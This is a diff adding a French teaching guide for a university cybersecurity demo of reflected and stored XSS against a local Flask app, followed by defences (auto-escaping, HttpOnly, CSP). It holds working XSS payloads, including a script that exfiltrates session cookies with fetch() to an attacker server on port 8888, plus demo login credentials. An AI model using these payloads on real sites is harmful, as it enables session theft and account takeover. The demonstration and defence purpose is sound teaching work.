@@ -1,0 +1,129 @@
+================================================================================
+                    GUIDE ET PIPELINE DE DEMONSTRATION XSS
+               De A a Z : Commandes, Ordre de passage et Payloads
+================================================================================
+Auteur     : Ayoub (Master Ingenierie Informatique - Module Cybersecurite CEH)
+Projet     : Demonstration Pratique d'Attaques XSS et Mecanismes de Defense
+Cible      : Port 5000 (Application Web Flask)
+Attaquant  : Port 8888 (Serveur C2 d'Exfiltration de Cookies)
+================================================================================
+
+TABLE DES MATIERES :
+  1. PREPARATION ET LANCEMENT
+  2. PHASE 1 : XSS REFLECHI (Reflected XSS via la recherche)
+  3. PHASE 2 : XSS STOCKE (Stored XSS via le livre d'or)
+  4. PHASE 3 : VOL REEL DE COOKIE DE SESSION (Exfiltration vers Port 8888)
+  5. PHASE 4 : DEMONSTRATION DES DEFENSES (Auto-escaping + HttpOnly + CSP)
+  6. TABLEAU COMPARATIF DES PAYLOADS A COPIER-COLLER
+
+================================================================================
+1. PREPARATION ET LANCEMENT
+================================================================================
+
+Ouvrez un terminal PowerShell et placez-vous dans le dossier xss-tp :
+  cd "c:\Users\DELL\Documents\Master\Master_M2I\SEMESTRE 3\Cybersécurité CEH\TPs\Exposé - CSRF Attack\xss-tp"
+
+Lancer le scenario vulnerable :
+  .\run_demo.bat vulnerable
+
+Deux fenetres s'ouvrent :
+  - Port 5000 : L'application web d'entreprise.
+  - Port 8888 : Le serveur pirate en attente de cookies exfiltres.
+
+
+================================================================================
+2. PHASE 1 : DEMONSTRATION DU XSS REFLECHI (Reflected XSS)
+================================================================================
+
+Concept pour l'audience :
+  Le payload n'est pas enregistre en base de donnees. Il est injecte dans l'URL
+  (souvent par un lien piege envoye par email) et le serveur le reflete
+  immediatement dans la page sans l'echapper.
+
+Action :
+  1. Ouvrez http://127.0.0.1:5000/search dans votre navigateur.
+  2. Dans la barre de recherche, tapez ce payload de preuve de concept (PoC) :
+     <script>alert('XSS Reflechi reussi sur le portail !')</script>
+  3. Cliquez sur "Rechercher".
+
+Resultat a montrer a l'audience :
+  - Une boite de dialogue alert() JavaScript surgit a l'ecran !
+  - Regardez l'URL : le script fait partie du parametre "?q=...".
+  - Si un attaquant envoie ce lien a une victime, le script s'execute chez elle !
+
+
+================================================================================
+3. PHASE 2 : DEMONSTRATION DU XSS STOCKE (Stored XSS)
+================================================================================
+
+Concept pour l'audience :
+  Le payload est stocke durablement sur le serveur (base de donnees, fichier ou memoire).
+  CHAQUE utilisateur qui consulte la page devient automatiquement une victime !
+
+Action :
+  1. Allez sur le livre d'or : http://127.0.0.1:5000/guestbook
+  2. Dans le champ message, collez :
+     <b>Merci pour le site !</b><script>alert('Alerte XSS Stocke : Chaque visiteur subit cette alerte !')</script>
+  3. Cliquez sur "Publier le message".
+
+Resultat a montrer :
+  - L'alerte pop immediatement.
+  - Actualisez la page (F5) ou ouvrez-la dans un autre onglet : L'ALERTE POP ENCORE !
+  - L'infection est persistante.
+
+
+================================================================================
+4. PHASE 3 : VOL REEL DE COOKIE DE SESSION (Exfiltration C2)
+================================================================================
+
+Concept pour l'audience :
+  Un pirate ne fait pas de simples "alert()". Son but est de voler la session
+  active de l'administrateur ou d'un employe pour usurper son identite.
+
+Action :
+  1. D'abord, connectez-vous avec Ayoub sur http://127.0.0.1:5000/login (Ayoub / password123).
+  2. Allez sur http://127.0.0.1:5000/guestbook.
+  3. Publiez ce message malveillant qui vole le cookie en arriere-plan :
+     <script>
+       fetch('http://127.0.0.1:8888/?cookie=' + encodeURIComponent(document.cookie));
+     </script>
+  4. Cliquez sur "Publier".
+
+Resultat dans la console de l'attaquant (Port 8888) :
+  - Regardez la fenetre noire de l'attaquant (Port 8888) :
+  -----------------------------------------------------------------------------
+  🚨 ALERTE SECURITE - COOKIE EXFILTRE PAR XSS !
+  [VOL REUSSI] Victime (127.0.0.1) -> Cookie : session=eyJ1c2VyIjoiQXlvdWIifQ...
+  -----------------------------------------------------------------------------
+  - L'attaquant dispose du cookie de session d'Ayoub et peut se connecter a sa place !
+
+
+================================================================================
+5. PHASE 4 : DEMONSTRATION DES DEFENSES (Version Securisee)
+================================================================================
+
+Fermez les fenetres et lancez la version securisee :
+  .\run_demo.bat secure
+
+Defense 1 : L'Echappement contextuel (Auto-escaping Jinja2)
+  - Refaites la recherche avec :
+    <script>alert('Test')</script>
+  - Resultat : Le texte apparait tel quel sous forme inoffensive :
+    "Résultats pour votre recherche : <script>alert('Test')</script>"
+  - L'inspecteur HTML montre que le serveur a converti < en &lt; et > en &gt;.
+
+Defense 2 : Le flag de Cookie 'HttpOnly'
+  - Ouvrez la console DevTools (F12 > Console) et tapez :
+    document.cookie
+  - Resultat : Le cookie de session n'apparait PAS ! Il est totalement invisible
+    pour le code JavaScript. Meme si un XSS subsistait, le vol de session est bloque !
+
+Defense 3 : Content-Security-Policy (CSP)
+  - L'en-tete HTTP : Content-Security-Policy: default-src 'self'
+  - Interdit strictement au navigateur d'executer des scripts inline ou d'envoyer
+    des requetes vers des domaines non autorises (ex: port 8888 de l'attaquant).
+
+================================================================================
+FIN DU GUIDE XSS
+================================================================================
+
